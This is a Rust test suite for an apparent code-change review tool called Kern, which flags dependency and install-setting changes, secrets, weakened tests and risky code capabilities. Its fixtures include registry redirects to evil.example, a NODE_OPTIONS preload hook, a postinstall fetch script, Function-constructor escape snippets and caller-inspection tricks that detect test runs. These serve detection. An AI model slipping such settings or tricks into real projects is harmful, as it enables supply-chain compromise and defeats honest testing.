use kern::receipt;
use kern::util::*;
use serde_json::{Value, json};
use std::path::{Path, PathBuf};
use std::process::Command;

struct Temp(PathBuf);
impl Temp {
    fn new() -> Temp {
        let p = std::env::temp_dir().join(format!("kern-noise-{}", uuid4().unwrap()));
        std::fs::create_dir_all(&p).unwrap();
        Temp(p)
    }
}
impl Drop for Temp {
    fn drop(&mut self) { let _ = std::fs::remove_dir_all(&self.0); }
}

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git").args(args).current_dir(dir).env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t").env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t").env("GIT_CONFIG_NOSYSTEM", "1").output().unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}
fn write(dir: &Path, path: &str, text: &str) {
    let p = dir.join(path);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, text).unwrap();
}
fn repo(t: &Temp, files: &[(&str, &str)]) -> (PathBuf, String) {
    let r = t.0.join("repo");
    std::fs::create_dir_all(&r).unwrap();
    git(&r, &["init", "-q", "-b", "main"]);
    git(&r, &["config", "core.autocrlf", "false"]);
    for (p, text) in files { write(&r, p, text); }
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-q", "--allow-empty", "-m", "base"]);
    let base = git(&r, &["rev-parse", "HEAD"]);
    (r, base)
}
fn commit(r: &Path, files: &[(&str, &str)], deleted: &[&str]) -> String {
    for (p, text) in files { write(r, p, text); }
    for p in deleted { git(r, &["rm", "-q", "-r", p]); }
    git(r, &["add", "-A"]);
    git(r, &["commit", "-q", "-m", "change"]);
    git(r, &["rev-parse", "HEAD"])
}
fn rules_for(base: &[(&str, &str)], head: &[(&str, &str)], deleted: &[&str]) -> Value {
    let t = Temp::new();
    let (r, b) = repo(&t, base);
    let h = commit(&r, head, deleted);
    kern::rules::rules(&r, &b, &h).unwrap()
}
fn drive_json() -> Value { json!({ "base": "1111111111111111111111111111111111111111", "head": "2222222222222222222222222222222222222222", "skipped": [], "unmeasured": [] }) }
fn clean_tests() -> Value { json!({ "status": "RAN", "runner": "vitest", "before": { "passed": 12, "failed": 0, "skipped": 0 }, "after": { "passed": 12, "failed": 0, "skipped": 0 }, "kept": 12, "broke": [], "flaky": [], "gone": [], "newly_skipped": [], "added": [], "already_failing": [], "new_problems": [] }) }
fn paths(rules: &Value, key: &str) -> Vec<String> { rules[key].as_array().unwrap().iter().filter_map(|x| x["path"].as_str().map(str::to_string)).collect() }

const VITEST: &str = r#"{"name":"poml","scripts":{"test":"vitest run"},"devDependencies":{"vitest":"3.2.0"}}"#;

#[test]
fn microsoft_poml_52_a_package_json_field_that_neither_runs_nor_steers_installs_is_not_a_dependency_change() {
    let before = r#"{"name":"poml","type":"commonjs","main":"out/index.js","engines":{"vscode":"^1.90.0"},"contributes":{"commands":[{"command":"poml.preview"}]},
        "scripts":{"test":"vitest run","lint":"eslint .","typecheck":"tsc"},"devDependencies":{"vitest":"3.2.0"}}"#;
    let after = r#"{"name":"poml","type":"module","main":"dist/index.js","exports":{".":"./dist/index.js"},"types":"dist/index.d.ts","engines":{"vscode":"^1.95.0"},
        "contributes":{"commands":[{"command":"poml.preview"},{"command":"poml.test"}]},"scripts":{"test":"vitest run","lint":"eslint src","typecheck":"tsc -b"},"devDependencies":{"vitest":"3.2.0"}}"#;
    let rules = rules_for(&[("package.json", before)], &[("package.json", after)], &[]);
    assert!(paths(&rules, "dependencies").is_empty(), "a VS Code extension's contributes, its entry points and its lint script install nothing and run nothing on install: {}", rules["dependencies"]);
}

#[test]
fn revenuecat_purchases_js_649_and_gatsby_39351_no_moved_package_and_a_deleted_manifest_are_not_dependency_changes() {
    let lock = |version: &str| format!(r#"{{"name":"purchases-js","version":"{version}","lockfileVersion":3,"packages":{{"":{{"name":"purchases-js","version":"{version}","devDependencies":{{"vitest":"3.2.0"}}}},"node_modules/vitest":{{"version":"3.2.0","resolved":"https://registry.npmjs.org/vitest/-/vitest-3.2.0.tgz","integrity":"sha512-abc"}}}}}}"#);
    let pkg = |version: &str| format!(r#"{{"name":"purchases-js","version":"{version}","scripts":{{"test":"vitest run"}},"devDependencies":{{"vitest":"3.2.0"}}}}"#);
    let rules = rules_for(&[("package.json", &pkg("1.17.1")), ("package-lock.json", &lock("1.17.1"))], &[("package.json", &pkg("1.18.1")), ("package-lock.json", &lock("1.18.1"))], &[]);
    assert!(paths(&rules, "dependencies").is_empty(), "a release that bumps only the project's own version moves no package it installs: {}", rules["dependencies"]);
    let checker = r#"{"name":"site-up-checker","scripts":{"test":"echo \"Error: no test specified\" && exit 1","start":"node index"},"dependencies":{"discord.js":"^11.1.0"}}"#;
    let rules = rules_for(&[("package.json", VITEST), ("scripts/site-up-checker/package.json", checker)], &[], &["scripts/site-up-checker"]);
    assert!(paths(&rules, "dependencies").is_empty(), "deleting a whole script package installs nothing new and runs nothing on install: {}", rules["dependencies"]);
    let rules = rules_for(&[("package.json", VITEST), ("package-lock.json", &lock("1.0.0"))], &[], &["package-lock.json"]);
    assert_eq!(paths(&rules, "dependencies"), ["package-lock.json"], "deleting the lockfile lets the next install pick new versions, so that stays: {}", rules["dependencies"]);
}

#[test]
fn epam_ketcher_8131_a_deleted_file_in_a_tests_folder_that_defines_no_test_removes_no_test() {
    let generator = "// const fs = require('fs');\n// const set1 = ['AhA', '@hA'];\n// fs.writeFileSync('out.txt', set1.join('\\n'));\n";
    let real = "import { test, expect } from 'vitest';\ntest('adds', () => expect(1 + 1).toBe(2));\n";
    let rules = rules_for(&[("package.json", VITEST), ("tests/generator.js", generator), ("tests/total.test.js", real)], &[], &["tests/generator.js", "tests/total.test.js"]);
    assert_eq!(paths(&rules, "deleted_tests"), ["tests/total.test.js"], "generator.js is commented-out code that defines no test, so deleting it removes nothing the tests check: {}", rules["deleted_tests"]);
}

#[test]
fn a_lifecycle_script_or_an_install_setting_in_package_json_is_a_dependency_change() {
    let after = r#"{"name":"poml","scripts":{"test":"vitest run","postinstall":"node fetch.js"},"overrides":{"tar":"7.0.0"},"packageManager":"pnpm@10.0.0","trustedDependencies":["esbuild"],
        "bin":{"poml":"cli.js"},"devDependencies":{"vitest":"3.2.0"}}"#;
    let rules = rules_for(&[("package.json", VITEST)], &[("package.json", after)], &[]);
    let fields: Vec<String> = rules["dependencies"][0]["fields"].as_array().unwrap_or(&vec![]).iter().map(|f| f.as_str().unwrap().to_string()).collect();
    assert_eq!(fields, ["bin", "overrides", "packageManager", "scripts.postinstall", "trustedDependencies"], "each runs code on install or decides what gets installed: {}", rules["dependencies"]);
}

#[test]
fn near_api_js_1642_a_package_that_moves_between_sections_with_the_same_range_is_not_new() {
    let old = json!({ "dependencies": { "@noble/hashes": "^1.7.1", "randombytes": "^2.1.0" } });
    let new = json!({ "peerDependencies": { "@noble/hashes": "^1.7.1" } });
    let moves = kern::deps::changed_versions(&old, &new);
    assert_eq!(moves, [json!({ "name": "randombytes", "from": "^2.1.0", "to": null })], "the package is still there with the same range: {moves:?}");
    assert_eq!(kern::deps::moves(&old, &new), ["randombytes (removed)"]);
    let new = json!({ "devDependencies": { "@noble/hashes": "^1.8.0" } });
    let moves = kern::deps::changed_versions(&old, &new);
    assert!(moves.contains(&json!({ "name": "@noble/hashes", "from": "^1.7.1", "to": "^1.8.0" })), "a move with a new range is an update from the old range, not a new package: {moves:?}");
    assert_eq!(kern::deps::moves(&old, &new), ["@noble/hashes ^1.7.1 → ^1.8.0", "randombytes (removed)"]);
}

#[test]
fn constructive_io_blocks_35_a_package_of_this_repository_added_as_a_dependency_is_a_note_never_a_look() {
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", r#"{"name":"blocks","private":true,"workspaces":["packages/*"]}"#), ("packages/json-renderer/package.json", r#"{"name":"json-renderer","version":"1.0.0"}"#),
        ("packages/flow/package.json", r#"{"name":"flow","dependencies":{"left-pad":"^1.3.0"}}"#)]);
    let head = commit(&r, &[("packages/flow/package.json", r#"{"name":"flow","dependencies":{"left-pad":"^1.3.0","json-renderer":"*","local-helper":"file:../helper","linked":"link:../linked","yarn-portal":"portal:../portal","pinned":"workspace:^"}}"#)], &[]);
    let rules = kern::rules::rules(&r, &base, &head).unwrap();
    assert_eq!(rules["dependencies"][0]["packages"], json!(["json-renderer * (new)", "linked link:../linked (new)", "local-helper file:../helper (new)", "pinned workspace:^ (new)", "yarn-portal portal:../portal (new)"]), "{}", rules["dependencies"]);
    let built = receipt::build(&drive_json(), &rules, &clean_tests());
    assert_eq!((built["decision"].as_str(), look_kinds(&built), note_kinds(&built)), (Some("clear"), vec![], vec!["dependencies".to_string()]), "what moved is listed where a person scans it; nothing Kern measures says more: {built}");
}

fn caps(path: &str, src: &str) -> Vec<String> { kern::capability::footprint(path, src).unwrap().into_iter().collect() }

#[test]
fn nanhesam_eveokee_monorepo_2_a_variable_the_framework_builds_into_the_page_is_never_a_secret() {
    for public in ["EXPO_PUBLIC_REVENUECAT_ANDROID_API_KEY", "NEXT_PUBLIC_STRIPE_KEY", "VITE_API_KEY", "REACT_APP_FIREBASE_API_KEY", "PUBLIC_SUPABASE_ANON_KEY", "GATSBY_ALGOLIA_SEARCH_KEY",
        "NUXT_PUBLIC_API_TOKEN", "VUE_APP_MAPS_KEY", "STORYBOOK_TOKEN"] {
        assert!(!kern::capability::secret_name(public), "{public} is built into the page every visitor downloads");
    }
}

#[test]
fn review_2_b_a_secret_is_a_name_whose_last_word_is_a_credential() {
    for setting in ["CACHE_KEY_PREFIX", "SESSION_TTL", "AUTH_ENABLED", "DB_PORT", "DB_HOST", "TOKEN_TTL", "PASSWORD_MIN_LENGTH", "STRIPE_PUBLISHABLE_KEY", "VAPID_PUBLIC_KEY", "SECRET_NAME", "API_URL"] {
        assert!(!kern::capability::secret_name(setting), "{setting} names a setting about a credential, not the credential");
    }
    for secret in ["VERIFIER_API_KEY", "PUSHOVER_TOKEN", "PUSHOVER_USER_KEY", "SK_LIVE", "API_KEY_PROD", "MONGODB_URI", "CONNECTION_STRING", "JWT_SECRET", "SESSION_SECRET", "BASIC_AUTH",
        "SMTP_PASS", "PGPASSWORD", "OPENAI_APIKEY", "DATABASE_URL", "SENTRY_DSN", "SLACK_WEBHOOK_URL", "dbPassword"] {
        assert!(kern::capability::secret_name(secret), "{secret}");
    }
}

#[test]
fn salfatigroup_opencheck_6_reading_a_class_name_or_comparing_classes_runs_no_code() {
    for harmless in ["export const errorName = (error) => error instanceof Error ? error.constructor.name : 'UnknownError';",
        "export class NotFound extends Error { constructor(m) { super(m); Error.captureStackTrace(this, this.constructor); } }",
        "export const plain = (v) => v !== null && v.constructor === Object;", "export const same = (a, b) => a instanceof b.constructor;"] {
        assert!(!caps("src/cli.js", harmless).iter().any(|c| c.starts_with("code:")), "{harmless}: {:?}", caps("src/cli.js", harmless));
    }
    for reach in ["[].constructor.constructor('return process')();", "export const f = (() => {}).constructor('return 1');",
        "const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;\nexport const run = (src) => new AsyncFunction(src)();", "export const make = (o) => o.constructor;",
        "export const name = (o) => o.constructor.constructor.name;"] {
        assert!(caps("src/a.js", reach).contains(&"code:constructor".to_string()), "{reach} reaches the Function constructor");
    }
}

#[test]
fn alibaba_hooks_2916_a_test_that_expects_any_function_runs_no_code() {
    for harmless in ["expect(addListener).toHaveBeenCalledWith(expect.any(Function));", "expect(listener).toBeInstanceOf(Function);"] {
        assert!(!caps("src/useTheme/__tests__/index.spec.ts", harmless).contains(&"code:Function".to_string()), "workos/workos-node#1694 does the same: {harmless}");
    }
    assert!(!caps("src/a.js", "export const callable = (f) => f instanceof Function;").contains(&"code:Function".to_string()));
    for runs in ["new Function('return import(\"open\")')();", "Reflect.construct(Function, ['return 1'])();", "const F = Function;\nexport const f = F('return 1');",
        "export const f = Function('a', 'return a');", "const expect = { any: (F) => F('return process')() };\nexpect.any(Function);"] {
        assert!(caps("src/a.js", runs).contains(&"code:Function".to_string()), "{runs}");
    }
}

#[test]
fn bassa01_google_cloud_mcp_61_a_test_that_swaps_fetch_for_a_mock_calls_no_network() {
    let swap = "import { vi, beforeEach, afterEach } from 'vitest';\nconst originalFetch = globalThis.fetch;\nconst fetchMock = vi.fn();\nbeforeEach(() => { globalThis.fetch = fetchMock as typeof fetch; });\nafterEach(() => { globalThis.fetch = originalFetch; });\n";
    for mock in [swap, "global.fetch = vi.fn();", "window.fetch = jest.fn();"] {
        assert!(!caps("test/unit/services/trace/resources.test.ts", mock).contains(&"global:fetch".to_string()), "replacing fetch with a mock is not calling it: {mock}");
    }
    for calls in ["globalThis.fetch('https://x.invalid');", "const f = globalThis.fetch;\nf('https://x.invalid');", "fetch('https://x.invalid');",
        "const saved = globalThis.fetch;\nexport const send = () => saved('https://x.invalid');\nglobalThis.fetch = saved;"] {
        assert!(caps("test/a.test.ts", calls).contains(&"global:fetch".to_string()), "{calls}");
    }
}

#[test]
fn review_2_b_a_module_the_build_tool_makes_is_no_power() {
    let risky = |src: &str| caps("src/main.ts", src).into_iter().filter(|c| kern::rules::risky(c)).collect::<Vec<_>>();
    assert_eq!(risky("import 'virtual:uno.css';\nimport routes from 'virtual:generated-pages';\nimport { getCollection } from 'astro:content';\nexport default [routes, getCollection];"), Vec::<String>::new());
    assert_eq!(risky("import { API_SECRET } from 'astro:env/server';\nexport const s = API_SECRET;"), ["process:env"], "astro:env/server hands out secrets");
    assert!(!risky("import x from 'data:text/javascript,export default 1';\nexport default x;").is_empty(), "a data: URL is code from text");
    assert!(!risky("import x from 'https://deno.land/x/mod.ts';\nexport default x;").is_empty(), "code fetched from the network");
}

const JEST: &str = r#"{"name":"cryptoformat","scripts":{"test":"jest"},"devDependencies":{"jest":"29.7.0"}}"#;

#[test]
fn coingecko_cryptoformat_76_jest_runs_a_file_named_test_js_as_a_test() {
    for test in ["src/test.js", "lib/spec.ts", "test.tsx"] { assert!(kern::suite::is_test_path(test), "jest's default testMatch runs {test}"); }
    for code in ["src/latest.js", "src/testing.js", "src/contest.ts", "test.config.js", "src/test.d.ts", "src/test.json"] { assert!(!kern::suite::is_test_path(code), "{code}"); }
    let before = "const f = require('./index');\ntest('formats', () => expect(f(1)).toBe('1.00'));\n";
    let rules = rules_for(&[("package.json", JEST), ("src/index.js", "module.exports = (n) => n.toFixed(2);\n"), ("src/test.js", before)],
        &[("src/test.js", &format!("{before}test('rounds', () => expect(f(1.005)).toBe('1.00'));\n"))], &[]);
    assert!(rules["tricks"].as_array().unwrap().is_empty(), "a test file that uses the test runner is the test runner's own: {}", rules["tricks"]);
}

#[test]
fn review_2_b_code_that_reads_an_ast_nodes_callee_or_builds_its_own_error_does_not_reach_the_test_runner() {
    let base = [("package.json", VITEST), ("src/a.js", "export const a = 1;\n")];
    let rules = rules_for(&base, &[("src/rule.js", "export const callee = (node) => node.callee.name + String(node.callee.caller);\n"),
        ("src/errors.ts", "export class AppError extends Error {\n  constructor(m: string) {\n    super(m);\n    Error.captureStackTrace(this, AppError);\n  }\n}\n")], &[]);
    assert!(paths(&rules, "tricks").is_empty(), "ESLint rules read node.callee, and a custom error captures its own stack: {}", rules["tricks"]);
    let rules = rules_for(&base, &[("src/who.js", "export function who() { return arguments.callee.caller; }\n"),
        ("src/stack.js", "export const stack = () => { const o = {}; Error.captureStackTrace(o); return o.stack; };\n"),
        ("src/trace.js", "Error.prepareStackTrace = (_, s) => s;\nexport const at = () => 1;\n"), ("src/made.js", "export const at = () => new Error().stack;\n"),
        ("src/me.js", "export function me() { return me.caller; }\n")], &[]);
    assert_eq!(paths(&rules, "tricks"), ["src/made.js", "src/me.js", "src/stack.js", "src/trace.js", "src/who.js"], "each reads who called it, which is how code tells it runs under a test: {}", rules["tricks"]);
}

#[test]
fn ethtaipei_website_322_a_config_the_runner_kern_runs_never_reads_changes_no_test() {
    let base = [("package.json", VITEST), ("src/a.js", "export const a = 1;\n"), (".babelrc", "{}\n"), ("babel.config.js", "module.exports = {};\n"), ("jest.config.js", "module.exports = {};\n"),
        ("karma.conf.js", "module.exports = () => {};\n"), ("playground/define/package.json", r#"{"name":"define","private":true,"scripts":{"dev":"vite"}}"#),
        ("playground/define/vite.config.js", "export default {};\n"), ("vitest.config.ts", "export default {};\n"), ("vite.config.ts", "export default {};\n")];
    let rules = rules_for(&base, &[(".babelrc", "{\"presets\":[\"next/babel\"]}\n"), ("babel.config.js", "module.exports = { presets: [] };\n"), ("jest.config.js", "module.exports = { roots: [] };\n"),
        ("karma.conf.js", "module.exports = (c) => c.set({});\n"), ("playground/define/vite.config.js", "export default { define: { X: 1 } };\n"), ("vite.config.ts", "export default { base: '/x/' };\n")], &[]);
    assert!(paths(&rules, "settings").is_empty(), "vitest reads its own vitest.config here, and none of these (vitejs/vite#20998, mui/mui-public#578): {}", rules["settings"]);
    let rules = rules_for(&base, &[("vitest.config.ts", "export default { test: { include: [] } };\n")], &[]);
    assert_eq!(paths(&rules, "settings"), ["vitest.config.ts"]);
}

#[test]
fn a_config_the_runner_kern_runs_reads_or_one_kern_cannot_place_still_needs_a_look() {
    let jest = rules_for(&[("package.json", JEST), ("src/a.js", "module.exports = 1;\n"), ("babel.config.js", "module.exports = {};\n")], &[("babel.config.js", "module.exports = { plugins: ['strip-tests'] };\n")], &[]);
    assert_eq!(paths(&jest, "settings"), ["babel.config.js"], "babel-jest transforms every test with it");
    let vite = rules_for(&[("package.json", VITEST), ("vite.config.ts", "export default {};\n")], &[("vite.config.ts", "export default { test: { include: ['nothing/**'] } };\n")], &[]);
    assert_eq!(paths(&vite, "settings"), ["vite.config.ts"], "with no vitest.config beside it, vitest reads vite.config");
    let merged = rules_for(&[("package.json", VITEST), ("vite.config.ts", "export default {};\n"), ("vitest.config.ts", "import base from './vite.config';\nexport default base;\n")],
        &[("vite.config.ts", "export default { test: { include: [] } };\n")], &[]);
    assert_eq!(paths(&merged, "settings"), ["vite.config.ts"], "the vitest config builds on vite.config");
    let turbo = r#"{"name":"mono","private":true,"workspaces":["packages/*"],"scripts":{"test":"turbo test"}}"#;
    let mono = rules_for(&[("package.json", turbo), ("babel.config.js", "module.exports = {};\n")], &[("babel.config.js", "module.exports = { plugins: [] };\n")], &[]);
    assert_eq!(paths(&mono, "settings"), ["babel.config.js"], "each package picks its own runner, so Kern keeps the look");
}

#[test]
fn review_2_b_only_files_that_run_code_or_grant_access_need_a_look() {
    let base = [("package.json", VITEST), ("src/a.js", "export const a = 1;\n"), (".env.development", "PORT=3000\n")];
    let quiet = rules_for(&base, &[(".github/FUNDING.yml", "github: [me]\n"), (".github/assets/logo.png", "PNG"), (".github/screenshot.svg", "<svg/>"), (".github/release.yml", "changelog: {}\n"),
        (".env.development", "PORT=3001\nNEXT_PUBLIC_SITE_URL=http://localhost:3001\n# local only\n"), (".env.test", "export DEBUG=true\nLOG_LEVEL=info\n"),
        (".env.local.example", "OPENAI_API_KEY=\n"), ("apps/web/.env.migrate.example", "DATABASE_PASSWORD=change-me\n")], &[]);
    assert!(paths(&quiet, "protected").is_empty(), "sponsor links, pictures, release-note headings, local settings and .env templates (eyeread.in#30, maruhi#239) neither run code nor grant access: {}", quiet["protected"]);
    let loud = rules_for(&base, &[(".github/labeler.yml", "safe-to-test: ['**']\n"), (".github/workflows/ci.yml", "on: push\n"), (".env.development", "PORT=3001\nOPENAI_API_KEY=sk-live-123\n"),
        (".env.local", "NODE_OPTIONS=--require ./hook.js\n"), (".env.ci", "npm_config_registry=https://evil.example\n"), (".env.prod", "A=\"multi\nline\"\n"), ("renovate.json", "{\"automerge\": true}\n")], &[]);
    assert_eq!(paths(&loud, "protected"), [".env.ci", ".env.development", ".env.local", ".env.prod", ".github/labeler.yml", ".github/workflows/ci.yml", "renovate.json"],
        "a label can unlock a safe-to-test workflow, a committed key is a leak, NODE_OPTIONS and npm settings run code, and renovate can merge on its own");
}

#[test]
fn a_bunfig_toml_or_a_bun_setting_steers_what_kerns_own_bun_installs_so_a_change_to_it_needs_a_look() {
    let base = [("package.json", VITEST), ("src/a.js", "export const a = 1;\n"), ("bun.lock", "{}\n")];
    let loud = rules_for(&base, &[("bunfig.toml", "[install]\nregistry = \"https://evil.example\"\nglobalStore = true\n"), ("packages/web/bunfig.toml", "[install]\nlinker = \"hoisted\"\n"),
        (".env.ci", "BUN_CONFIG_REGISTRY=https://evil.example\n")], &[]);
    assert_eq!(paths(&loud, "protected"), [".env.ci", "bunfig.toml", "packages/web/bunfig.toml"],
        "Kern's own Bun reads bunfig.toml and BUN_ settings while it installs: a registry, a linker or a global store decides what the tests load");
}

#[test]
fn launchdarkly_js_sdk_common_146_a_change_that_only_adds_tests_rewrites_nothing() {
    let path = "src/__tests__/diagnosticEvents-test.js";
    let before = "describe('diagnostics', () => {\n  it('counts events', () => {\n    expect(count(1)).toBe(1);\n  });\n});\n";
    let added = "describe('diagnostics', () => {\n  it('counts events', () => {\n    expect(count(1)).toBe(1);\n  });\n\n  it('counts drops', () => {\n    expect(count(0)).toBe(0);\n  });\n});\n\ndescribe('streams', () => {\n  beforeEach(() => reset());\n  it.each([[1], [2]])('opens %i', (n) => expect(open(n)).toBe(true));\n});\n";
    assert!(kern::weaken::only_adds_tests(path, before, added), "two new tests and a new group with its own hook leave the old test as it was");
    let edits = [added.replace("toBe(1)", "toBe(2)"), format!("beforeEach(() => vi.mock('./count'));\n{added}"),
        added.replacen("describe('diagnostics', () => {\n", "describe('diagnostics', () => {\n  beforeEach(() => vi.useFakeTimers());\n", 1), before.replace("counts events", "counts all events"),
        before.replace("  });\n});\n", "  });\n  it('counts events', () => expect(count(2)).toBe(1));\n});\n")];
    for edited in edits { assert!(!kern::weaken::only_adds_tests(path, before, &edited), "this changes what an existing test does or checks:\n{edited}"); }
}

#[test]
fn remix_run_react_router_15628_an_edited_test_file_that_only_gained_tests_needs_no_run_of_its_old_version() {
    use kern::proof::{Count, Report};
    let t = Temp::new();
    let before = "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\ntest('adds', () => expect(total([1, 2])).toBe(3));\n";
    let (r, base) = repo(&t, &[("package.json", VITEST), ("src/total.js", "export const total = (xs) => xs.reduce((a, b) => a + b, 0);\n"), ("test/total.test.js", before)]);
    let old = Report { tests: [("test/total.test.js > adds".to_string(), Count { passed: 1, failed: 0, skipped: 0 })].into_iter().collect(), ..Report::default() };
    let code = "export const total = (xs) => xs.reduce((a, b) => a + b, 0);\nexport const none = () => 0;\n";
    let added = commit(&r, &[("src/total.js", code), ("test/total.test.js", &format!("{before}test('adds nothing', () => expect(total([])).toBe(0));\n"))], &[]);
    let plan = kern::suite::kept_plan(&r, (&base, &added), &kern::rules::changed(&r, &base, &added).unwrap(), &old, "");
    assert!(plan.run.is_empty() && plan.skipped.is_empty(), "the old test is still in the file, unchanged, and already ran on the new code: {:?} {:?}", plan.run, plan.skipped);
    let edited = commit(&r, &[("src/total.js", code), ("test/total.test.js", &before.replace("toBe(3)", "toBe(4)"))], &[]);
    let plan = kern::suite::kept_plan(&r, (&base, &edited), &kern::rules::changed(&r, &base, &edited).unwrap(), &old, "");
    assert_eq!(plan.run.len(), 1, "an edited expectation still gets its old version run on the new code");
}

fn clean_rules() -> Value { json!({ "changed": [{ "path": "src/total.js", "operation": "modify" }], "powers": [], "tricks": [], "settings": [], "protected": [], "dependencies": [], "agent_notes": [], "not_checked": [] }) }
fn look_kinds(r: &Value) -> Vec<String> { r["look"].as_array().unwrap().iter().map(|x| x["kind"].as_str().unwrap().to_string()).collect() }
fn note_kinds(r: &Value) -> Vec<String> { r["notes"].as_array().unwrap().iter().map(|x| x["kind"].as_str().unwrap().to_string()).collect() }
fn report(tests: &[(&str, u32, u32, u32)]) -> kern::proof::Report {
    kern::proof::Report { tests: tests.iter().map(|(k, p, f, s)| (k.to_string(), kern::proof::Count { passed: *p, failed: *f, skipped: *s })).collect(), ..Default::default() }
}

#[test]
fn facebook_stylex_1888_a_file_kern_cannot_read_is_named_once() {
    let rules = rules_for(&[("package.json", VITEST), ("src/media.js", "export const a = 1;\n")], &[("src/media.js", "// @flow\nexport function parse(input: string): ?Query { return null; }\n")], &[]);
    assert_eq!(paths(&rules, "not_checked"), ["src/media.js"], "one file Kern could not read is one line, not one per rule that tried: {}", rules["not_checked"]);
}

#[test]
fn agentforscience_flamebird_13_a_test_the_change_removes_is_named_once() {
    let mut rules = clean_rules();
    let file = "tests/challenges/api-client.test.ts";
    rules["weakened"] = json!([{ "path": file, "removed": 2, "missing": ["Challenge API Client — method signatures > client has commentOnChallenge method", "Challenge API Client — method signatures > client has getChallengeComments method"], "emptied": [], "loosened": [] }]);
    let mut tests = clean_tests();
    tests["gone"] = json!([format!("{file} >  > Challenge API Client — method signatures > client has commentOnChallenge method"), format!("{file} >  > Challenge API Client — method signatures > client has getChallengeComments method")]);
    let r = receipt::build(&drive_json(), &rules, &tests);
    assert_eq!(look_kinds(&r), ["test-gone", "test-gone"], "vitest names an unnamed outer group with an empty title; the two removed tests are the two that no longer run: {}", r["look"]);
}

#[test]
fn a_deleted_test_file_is_one_look_that_says_how_many_tests_stopped_running() {
    let mut rules = clean_rules();
    rules["changed"] = json!([{ "path": "src/total.js", "operation": "modify" }, { "path": "test/old.test.js", "operation": "delete" }]);
    rules["deleted_tests"] = json!([{ "path": "test/old.test.js" }]);
    let mut tests = clean_tests();
    tests["gone"] = json!(["test/old.test.js > a", "test/old.test.js > b", "test/old.test.js > c", "test/other.test.js > d"]);
    let r = receipt::build(&drive_json(), &rules, &tests);
    assert_eq!(look_kinds(&r), ["test-deleted", "test-gone"], "{}", r["look"]);
    assert!(r["look"][0]["what"].as_str().unwrap().contains("3 tests that ran before"), "{}", r["look"][0]);
}

#[test]
fn agentforscience_flamebird_13_a_new_test_that_needs_the_network_is_not_checked_rather_than_a_look() {
    let before = report(&[("tests/a.test.ts > old", 1, 0, 0)]);
    let mut after = report(&[("tests/a.test.ts > old", 1, 0, 0), ("tests/e2e.test.ts > registers", 0, 1, 0), ("tests/unit.test.ts > adds", 0, 1, 0)]);
    after.why.insert("tests/e2e.test.ts > registers".into(), "TypeError: fetch failed\n  cause: Error: connect ECONNREFUSED 127.0.0.1:3000".into());
    after.why.insert("tests/unit.test.ts > adds".into(), "AssertionError: expected 3 to be 4".into());
    let c = kern::suite::compare(&before, &after, None);
    assert_eq!((&c["unrunnable"], &c["new_failing"]), (&json!(["tests/e2e.test.ts > registers"]), &json!(["tests/unit.test.ts > adds"])), "{c}");
    let r = receipt::build(&drive_json(), &clean_rules(), &c);
    assert_eq!(look_kinds(&r), ["new-test-fails"], "a new test that fails its own assertion is a look: {}", r["look"]);
    assert!(r["not_checked"].as_array().unwrap().iter().any(|x| x["what"].as_str().unwrap().contains("tests/e2e.test.ts")), "a new test that needs the network Kern's sandbox does not have is something Kern could not check: {}", r["not_checked"]);
}

#[test]
fn a_json_file_that_is_only_reformatted_changes_nothing_that_steers_the_project() {
    let compact = r#"{"extends":["config:base"],"schedule":["before 6am"]}"#;
    let pretty = "{\n  \"extends\": [\"config:base\"],\n  \"schedule\": [\"before 6am\"]\n}\n";
    let rules = rules_for(&[("package.json", VITEST), ("renovate.json", compact)], &[("renovate.json", pretty)], &[]);
    assert!(paths(&rules, "protected").is_empty(), "prettier reformatting renovate's config does nothing: {}", rules["protected"]);
    let rules = rules_for(&[("package.json", VITEST), ("renovate.json", compact)], &[("renovate.json", r#"{"extends":["config:base"],"automerge":true}"#)], &[]);
    assert_eq!(paths(&rules, "protected"), ["renovate.json"], "turning on automerge is a real change: {}", rules["protected"]);
}

#[test]
fn a_runner_config_that_only_gains_a_comment_or_new_formatting_changes_nothing_the_tests_check() {
    let config = "import { defineConfig } from 'vitest/config';\nexport default defineConfig({ test: { include: ['test/**/*.test.ts'] } });\n";
    let commented = "import { defineConfig } from \"vitest/config\";\n\n// Unit tests only; e2e runs in its own job.\nexport default defineConfig({\n  test: {\n    include: [\"test/**/*.test.ts\"],\n  },\n});\n";
    let rules = rules_for(&[("package.json", VITEST), ("vitest.config.ts", config)], &[("vitest.config.ts", commented)], &[]);
    assert!(paths(&rules, "settings").is_empty(), "a comment and new quotes do not change which tests run: {}", rules["settings"]);
    let narrowed = config.replace("test/**/*.test.ts", "test/unit/**/*.test.ts");
    let rules = rules_for(&[("package.json", VITEST), ("vitest.config.ts", config)], &[("vitest.config.ts", &narrowed)], &[]);
    assert_eq!(paths(&rules, "settings"), ["vitest.config.ts"], "narrowing what runs is a real change: {}", rules["settings"]);
}

fn power_of<'v>(rules: &'v Value, path: &str) -> Option<&'v Value> { rules["powers"].as_array().unwrap().iter().find(|p| p["path"] == path) }
fn listed_caps(v: &Value, key: &str) -> Vec<String> { v[key].as_array().into_iter().flatten().filter_map(|c| c.as_str().map(str::to_string)).collect() }

#[test]
fn tests_run_next_to_ci_secrets_so_one_that_reads_a_secret_and_reaches_the_network_is_a_look_and_one_that_only_fetches_is_quiet() {
    let quiet = "import { test } from 'vitest';\ntest('x', async () => { await fetch('http://localhost:1/trace'); });\n";
    let plain = "import { test } from 'vitest';\ntest('x', () => {});\n";
    let rules = rules_for(&[("package.json", VITEST), ("test/trace.test.ts", plain)], &[("test/trace.test.ts", quiet)], &[]);
    let p = power_of(&rules, "test/trace.test.ts").expect("the test gained fetch");
    assert_eq!((listed_caps(p, "added"), listed_caps(p, "has")), (vec!["global:fetch".to_string()], vec!["global:fetch".to_string()]), "{p}");
    assert!(look_kinds(&receipt::build(&drive_json(), &rules, &clean_tests())).is_empty(), "bassa01/google-cloud-mcp#61: a test that calls fetch and reads no secret cannot leak one");
